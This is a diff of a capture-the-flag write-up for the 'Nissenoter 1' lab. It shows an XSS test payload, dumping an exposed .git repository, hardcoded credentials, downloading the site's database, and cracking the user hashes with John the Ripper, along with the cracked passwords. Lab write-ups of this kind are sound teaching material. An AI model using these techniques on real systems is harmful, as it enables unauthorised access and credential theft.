-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">12345678</span>
-</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-</span></span><span style="display:flex;"><span>Session completed.
-</span></span></code></pre></div><p>We managed to crack the Bcrypt passwords, despite it taking close to an hour! It doesn&rsquo;t however appear that they changed their passwords. This leaves us the following credential notes</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>|   Password     |   Username   |
-</span></span><span style="display:flex;"><span>| -------------- | ------------ |
-</span></span><span style="display:flex;"><span>| 12345678       | (smukke)     |
-</span></span><span style="display:flex;"><span>| chocolate      | (gunter)     |
-</span></span><span style="display:flex;"><span>| password1      | (springer)   |
-</span></span><span style="display:flex;"><span>| abcdef         | (fritz)      |
-</span></span><span style="display:flex;"><span>| christmas      | (torden)     |
-</span></span><span style="display:flex;"><span>| midnight1      | (olufsand)   |
-</span></span><span style="display:flex;"><span>| beautiful!     | (amor)       |
-</span></span><span style="display:flex;"><span>| nooneknows     | (nissen)     |
-</span></span><span style="display:flex;"><span>| merrychristmas | (komet)      |
-</span></span><span style="display:flex;"><span>| julemand       | (hansi)      |
-</span></span><span style="display:flex;"><span>| christmastime  | (danser)     |
-</span></span><span style="display:flex;"><span>| ilovechristmas | (konge)      |
-</span></span><span style="display:flex;"><span>| commander007   | (rudolf)     |
-</span></span><span style="display:flex;"><span>| !happiness!    | (lyn)        |
-</span></span></code></pre></div><p>When we try to login, we identify invalid credentials for &ldquo;smukke&rdquo;, which might idendicate a disabled user, so we try &ldquo;gunter&rdquo; instead, which yields a valid login!</p>
-<p>Now the next stage of enumeration can commence, seeing as we have managed to establish a foothold on the webapp.</p>
-<h3 id="getting-first-flag">Getting first flag<a href="#getting-first-flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>We quickly check out the headers navigation links &ldquo;Forsiden&rdquo;, &ldquo;Profil&rdquo; &amp; &ldquo;Noter&rdquo;, the latter being an instant success for our flag for Nissenoter 1!</p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/Noter%20with%20flag.png" alt="Noter with flag"></p>
-<p><img src="/nc3/boot2root/nissenoter-1/images/First%20flag.png" alt="First flag"></p>
-<p>Thanks to &ldquo;rudolf&rdquo; we can submit the first flag and move on to <a href="/nc3/boot2root/nissenoter-2/">Nissenoter 2</a>!</p>
-<h2 id="flag">Flag<a href="#flag" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>NC3{1. Get .git; 2. Get database; 3. ????; 4. Profit!}
-</span></span></code></pre></div><h2 id="reflections-and-learnings">Reflections and Learnings<a href="#reflections-and-learnings" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
-<h3 id="the-value-of-comprehensive-enumeration">The Value of Comprehensive Enumeration<a href="#the-value-of-comprehensive-enumeration" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>This challenge highlighted the importance of comprehensive enumeration in cybersecurity. The initial nmap scan revealed critical information about open ports and and the available git repository, guiding the subsequent investigation steps. It&rsquo;s a reminder that a thorough initial scan can save time and provide a clear direction for exploration.</p>
-<h3 id="importance-of-exploring-unconventional-avenues">Importance of Exploring Unconventional Avenues<a href="#importance-of-exploring-unconventional-avenues" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Discovering the git repository and the SQLite database demonstrated the value of exploring unconventional avenues. These findings were not immediately apparent and required a deep dive into the server&rsquo;s structure. This emphasizes the need to think outside the box and consider non-obvious attack vectors.</p>
-<h3 id="persistence-and-attention-to-detail-in-password-cracking">Persistence and Attention to Detail in Password Cracking<a href="#persistence-and-attention-to-detail-in-password-cracking" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
-<p>Cracking the password hashes, particularly the bcrypt hashes, required persistence and attention to detail. The successful cracking of these passwords underlines the importance of having a comprehensive wordlist like rockyou and the capability to recognize and leverage different hash types.</p>
-
-		</div>
-	</main>
-
-<footer id="site-footer" class="section-inner thin animated fadeIn faster">
-  <p>
-    &copy; 2025 <a href="http://localhost:1313/">Adamino</a>
-    &#183; The quieter you become the more you are able to hear
-    
-    &#183;
-    
-  </p>
-
-</footer>
-
-<a href="#" class="scroll-up"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-<noscript>
-    <a href="#" class="scroll-up show"><svg xmlns="http://www.w3.org/2000/svg" fill="#3B3E48" width="64px" height="64px"
-  viewBox="-2.4 -2.4 28.80 28.80" id="up-circle" data-name="Flat Color"
-  xmlns="http://www.w3.org/2000/svg" class="icon flat-color" stroke="#3B3E48"
-  stroke-width="0.00024000000000000003">
-  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-  <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC"
-    stroke-width="0.9600000000000002">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-  <g id="SVGRepo_iconCarrier">
-    <circle id="primary" cx="12" cy="12" r="10" style="fill: #3B3E48;"></circle>
-    <path id="secondary"
-      d="M15,14a1,1,0,0,1-.71-.29L12,11.41l-2.29,2.3a1,1,0,0,1-1.42-1.42l3-3a1,1,0,0,1,1.42,0l3,3a1,1,0,0,1,0,1.42A1,1,0,0,1,15,14Z"
-      style="fill: #0077b6;"></path>
-  </g>
-</svg></a>
-</noscript>
-<script async src="http://localhost:1313/js/scrollwatcher.min.11bd2ce6f91dfb64095448b76ac1930124a42dc7133488e6d3d5aae7badaf562.js" integrity="sha256-Eb0s5vkd+2QJVEi3asGTASSkLccTNIjm09Wq57ra9WI=" crossorigin="anonymous"></script>
-<script async src="http://localhost:1313/js/bundle.min.038214de9d568246fadcfeb06c69349925de3209f332ec123861b6aa031d63c6.js" integrity="sha256-A4IU3p1Wgkb63P6wbGk0mSXeMgnzMuwSOGG2qgMdY8Y=" crossorigin="anonymous"></script>
-</body>
-
-</html>
+When looking through the shouts in the box we see different characters being used, which decreases the likelyhood of <a href=https://owasp.org/www-community/attacks/xss/>Cross Site Scripting (XSS)</a> working, but it should be tested regardless! The simplest test is to try out if an alert box can be opened</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;script&gt;alert<span style=color:#f92672>(</span>‘XSS’<span style=color:#f92672>)</span>&lt;/script&gt;
+</span></span></code></pre></div><p>If an alert box were to open on the webapp, we could utilize more complex XSS attacks to exploit our way in, but unfortunately the text just gets added as a shout.</p><p>We take note of the endpoint request when adding the shout at &ldquo;/api/shout/add&rdquo; and also take note of the format of the user shouts, which just seems to be hexadecimals. When we decode the values we don&rsquo;t get anything useful.</p><p>Having tested the site functionality we remember to check out the &ldquo;nissenoter.nc3/robots.txt&rdquo;, that we saw from our nmap scan.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>User-Agent: *
+</span></span><span style=display:flex><span>Disallow: /static/
+</span></span></code></pre></div><p>Interestingly we see that there is a &ldquo;/static/&rdquo; folder, for which we are prevented access.</p><p>We also need to check out if we can &ldquo;dump&rdquo; the git repository on the webapp. There are a few great tools for this, one well known being the <a href=https://github.com/arthaud/git-dumper>git-dumper</a> cli tool, but I recently came across something even faster, which is a browser extension that can automatically detect available repositories on websites and even download them, called <a href=https://github.com/davtur19/DotGit>DotGit</a>.</p><p><img src=/nc3/boot2root/nissenoter-1/images/DotGit.png alt="Dot Git Found Repo"></p><p>Often when dumping a git repository we won&rsquo;t be able to fetch all files, so we need to reset it to the original state, which can be achieved with the git command</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/nissenoter_nc3<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ git status
+</span></span><span style=display:flex><span>On branch master
+</span></span><span style=display:flex><span>Changes not staged <span style=color:#66d9ef>for</span> commit:
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git add/rm &lt;file&gt;...&#34;</span> to update what will be committed<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>  <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git restore &lt;file&gt;...&#34;</span> to discard changes in working directory<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>	deleted:    .gitignore
+</span></span><span style=display:flex><span>	deleted:    .htaccess
+</span></span><span style=display:flex><span>	deleted:    composer.json
+</span></span><span style=display:flex><span>	deleted:    composer.lock
+</span></span><span style=display:flex><span>	deleted:    core.php
+</span></span><span style=display:flex><span>	deleted:    core/Container.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/AuthController.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/ControllerInterface.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/IndexController.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/NotesController.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/ProfileController.php
+</span></span><span style=display:flex><span>	deleted:    core/Controllers/ShoutController.php
+</span></span><span style=display:flex><span>	deleted:    core/Models/User.php
+</span></span><span style=display:flex><span>	deleted:    core/Utils/Database.php
+</span></span><span style=display:flex><span>	deleted:    core/Utils/Flash.php
+</span></span><span style=display:flex><span>	deleted:    core/Utils/HTTP.php
+</span></span><span style=display:flex><span>	deleted:    core/Utils/Session.php
+</span></span><span style=display:flex><span>	deleted:    core/Utils/Variable.php
+</span></span><span style=display:flex><span>	deleted:    core/index.html
+</span></span><span style=display:flex><span>	deleted:    index.php
+</span></span><span style=display:flex><span>	deleted:    robots.txt
+</span></span><span style=display:flex><span>	deleted:    static/bootstrap/bootstrap.min.css
+</span></span><span style=display:flex><span>	deleted:    static/bootstrap/bootstrap.min.css.map
+</span></span><span style=display:flex><span>	deleted:    static/bootstrap/bootstrap.min.js
+</span></span><span style=display:flex><span>	deleted:    static/bootstrap/bootstrap.min.js.map
+</span></span><span style=display:flex><span>	deleted:    static/default.css
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/css/all.min.css
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-brands-400.ttf
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-brands-400.woff2
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-regular-400.ttf
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-regular-400.woff2
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-solid-900.ttf
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-solid-900.woff2
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-v4compatibility.ttf
+</span></span><span style=display:flex><span>	deleted:    static/fontawesome-free-6.2.1-web/webfonts/fa-v4compatibility.woff2
+</span></span><span style=display:flex><span>	deleted:    static/index.css
+</span></span><span style=display:flex><span>	deleted:    static/index.html
+</span></span><span style=display:flex><span>	deleted:    static/templates/errors/400.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/errors/403.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/errors/404.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/errors/405.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/errors/500.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/footer.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/index.html
+</span></span><span style=display:flex><span>	deleted:    static/templates/index.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/login.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/master.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/navbar.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/notes_add.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/notes_index.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/notes_view.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/profile.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/profile_edit.twig
+</span></span><span style=display:flex><span>	deleted:    static/templates/shoutbox.twig
+</span></span><span style=display:flex><span>	deleted:    user_notes/.htaccess
+</span></span><span style=display:flex><span>	deleted:    user_notes/index.html
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>no changes added to commit <span style=color:#f92672>(</span>use <span style=color:#e6db74>&#34;git add&#34;</span> and/or <span style=color:#e6db74>&#34;git commit -a&#34;</span><span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/nissenoter_nc3<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ git restore .
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/nissenoter_nc3<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ git status
+</span></span><span style=display:flex><span>On branch master
+</span></span><span style=display:flex><span>nothing to commit, working tree clean
+</span></span></code></pre></div><p>With the repository fully restored, it turns out to be the repository for the webapp project we are currently browsing!</p><p><img src=/nc3/boot2root/nissenoter-1/images/Nissenoter-dump.png alt="Nissenoter Git Dump"></p><p>In general it is always a good idea to search for credentials in a repository, so first we search through all the files in the current branch and afterwards we search throughout the commit history.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nissenoter_nc3 @927598b7 &gt; git log
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>commit 1d121e8b65641709cb00af227f2c31d2f964b3d3
+</span></span><span style=display:flex><span>Author: nissen &lt;nissen@nordpolen.jul&gt;
+</span></span><span style=display:flex><span>Date:   Tue Nov <span style=color:#ae81ff>1</span> 12:42:00 <span style=color:#ae81ff>2022</span> +0100
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    Nu uden hardcoded bruger
+</span></span></code></pre></div><p>This seems very interesting, as it states that a hardcoded user has been removed! Let&rsquo;s check out the commit just before this removal.</p><p>In the previous commit we can see that in &ldquo;/core/Models/User.php&rdquo; the following implementation of the authenticate function contains some credentials!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>authenticate</span>(<span style=color:#a6e22e>string</span> $username, <span style=color:#a6e22e>string</span> $password) <span style=color:#f92672>:</span> <span style=color:#a6e22e>bool</span> {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($username <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;chefnissen&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $password <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;DenGyldneKanel&#39;</span>) {
+</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>user_id</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;chefnissen&#39;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>I immediately test out the credentials &ldquo;chefnissen:DenGyldneKanel&rdquo; in the login form and try to connect with SSH, but the credentials are unfortunately invalid.</p><p>It appears that we need to try harder, which is always a good mindset in hacking, so we return to the latest commit version of the repository and analyse the project files.</p><h3 id=getting-foothold-on-the-webapp>Getting foothold on the webapp<a href=#getting-foothold-on-the-webapp class=anchor aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>In the file /index.php we find a very intresting line for setting up a database connection!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$database <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Database</span>(<span style=color:#e6db74>&#39;core/nissebanden.db&#39;</span>);
+</span></span></code></pre></div><p>This database file does not exist in the repository, so let&rsquo;s see if we can download it!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>haaukins㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ wget http://nissenoter.nc3/core/nissebanden.db
+</span></span><span style=display:flex><span>--2023-12-21 05:59:37--  http://nissenoter.nc3/core/nissebanden.db
+</span></span><span style=display:flex><span>Resolving nissenoter.nc3 <span style=color:#f92672>(</span>nissenoter.nc3<span style=color:#f92672>)</span>... 77.76.246.224
+</span></span><span style=display:flex><span>Connecting to nissenoter.nc3 <span style=color:#f92672>(</span>nissenoter.nc3<span style=color:#f92672>)</span>|77.76.246.224|:80... connected.
+</span></span><span style=display:flex><span>HTTP request sent, awaiting response... <span style=color:#ae81ff>200</span> OK
+</span></span><span style=display:flex><span>Length: <span style=color:#ae81ff>20480</span> <span style=color:#f92672>(</span>20K<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Saving to: ‘nissebanden.db’
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>nissebanden.db      100%<span style=color:#f92672>[===================</span>&gt;<span style=color:#f92672>]</span>  20.00K  --.-KB/s    in 0s
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2023-12-21 05:59:37 <span style=color:#f92672>(</span><span style=color:#ae81ff>116</span> MB/s<span style=color:#f92672>)</span> - ‘nissebanden.db’ saved <span style=color:#f92672>[</span>20480/20480<span style=color:#f92672>]</span>
+</span></span></code></pre></div><p>Great Scott! We managed to download a database from the website!</p><p>If we take a look in &ldquo;/core/Utils/Database.php&rdquo; we can quickly identify, in the constructor of the class, that we are dealing with a SQLite database.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct(<span style=color:#a6e22e>string</span> $dbname) {
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>dsn</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sqlite:&#39;</span> <span style=color:#f92672>.</span> $dbname;
+</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>connect</span>();
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>There is a great tool for browsing SQLite database files, called <a href=https://sqlitebrowser.org/>DB Browser for SQLite</a>, which we can use to analyse the content.</p><p><img src=/nc3/boot2root/nissenoter-1/images/DB%20Browser.png alt="DB Browser"></p><p>When diving into the database, we see 2 tables: shouts & users, the latter being of highest interest!</p><p><img src=/nc3/boot2root/nissenoter-1/images/Users-table.png alt="Users table"></p><p>We quickly note down all the user information and take note of password hashes that we need to try and crack, along with the fact that only &ldquo;Oluf Sand&rdquo; has a last name and only a few users have roles and descriptions!</p><p>There are many good tools for analysing & cracking hashes, but I like <a href=https://hashes.com/en/tools/hash_identifier>Hashes.com</a> for a quick analysis, which yields us the identification of a <a href=https://en.wikipedia.org/wiki/Bcrypt>Bcrypt hash</a>.</p><p>What is important about Bcrypt is the &ldquo;input cost&rdquo;, which can help determine how feasible bruteforcing a hash might be.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>$2b$04$fVZgTuYoXVfTLpFFNY.UkeX3Pm1MDrV9h4bx/pA41o9s4i49.MYEK
+</span></span><span style=display:flex><span>\__/\/ \____________________/\_____________________________/
+</span></span><span style=display:flex><span>Alg Cost      Salt                        Hash
+</span></span></code></pre></div><p>With this in mind, we see a cost of 4 for the hashes we are working in, which is great news, seeing as the standard is 12. This gives us hope that a tool like <a href=https://hashcat.net/hashcat/>hashcat</a> or <a href=https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/>John The Ripper</a> might be successful, given a proper wordlist like <a href=https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt>rockyou</a>, which contains more than 14 million passwords!</p><p>There is however another interesting column in the table, which is &ldquo;old_hashes&rdquo; of the type BLOB (binary large object).
+With a nifty sql query we can extract these hashes with their respective usernames.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> username<span style=color:#f92672>||</span><span style=color:#e6db74>&#39;:&#39;</span><span style=color:#f92672>||</span>hex(old_hashes) <span style=color:#66d9ef>FROM</span> users
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>olufsand:F7F497C879D74A0AD51B90AEB158B58F
+</span></span><span style=display:flex><span>fritz:E80B5017098950FC58AAD83C8C14978E
+</span></span><span style=display:flex><span>hansi:99F2CF8253C31FCE12E59B0DA36E35D3
+</span></span><span style=display:flex><span>gunter:C378985D629E99A4E86213DB0CD5E70D
+</span></span><span style=display:flex><span>nissen:E91697A354EBB6C05444005205C30DA2
+</span></span><span style=display:flex><span>springer:7C6A180B36896A0A8C02787EEAFB0E4C
+</span></span><span style=display:flex><span>danser:602A6AA8B4EBD6BDF19B38085163EC86
+</span></span><span style=display:flex><span>smukke:25D55AD283AA400AF464C76D713C07AD
+</span></span><span style=display:flex><span>konge:FD83506C25FF1476D7F39349A1B90D81
+</span></span><span style=display:flex><span>komet:84DA0B929DC922D0958FDF870F546794
+</span></span><span style=display:flex><span>amor:B2B85EC7EC8CC4771B8D055AEE5F82B0
+</span></span><span style=display:flex><span>torden:3D4FE7A00BC6FB52A91685D038733D6F
+</span></span><span style=display:flex><span>lyn:191140C5F780C8D66203858C5055BEA8
+</span></span><span style=display:flex><span>rudolf:12679B745F71E4327FAE7801F39B634B
+</span></span></code></pre></div><p>When we try to identify these hashes we quickly see that they are MD5 hashes and very easily crackable with John!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ john md5_hashes.txt --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt --format<span style=color:#f92672>=</span>Raw-MD5
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>14</span> password hashes with no different salts <span style=color:#f92672>(</span>Raw-MD5 <span style=color:#f92672>[</span>MD5 128/128 AVX
+</span></span><span style=display:flex><span>4x3<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Warning: no OpenMP support <span style=color:#66d9ef>for</span> this hash type, consider --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span><span style=color:#ae81ff>12345678</span> <span style=color:#f92672>(</span>smukke<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>chocolate <span style=color:#f92672>(</span>gunter<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>password1 <span style=color:#f92672>(</span>springer<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>abcdef <span style=color:#f92672>(</span>fritz<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>christmas <span style=color:#f92672>(</span>torden<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>midnight1 <span style=color:#f92672>(</span>olufsand<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>beautiful! <span style=color:#f92672>(</span>amor<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>nooneknows <span style=color:#f92672>(</span>nissen<span style=color:#f92672>)</span>
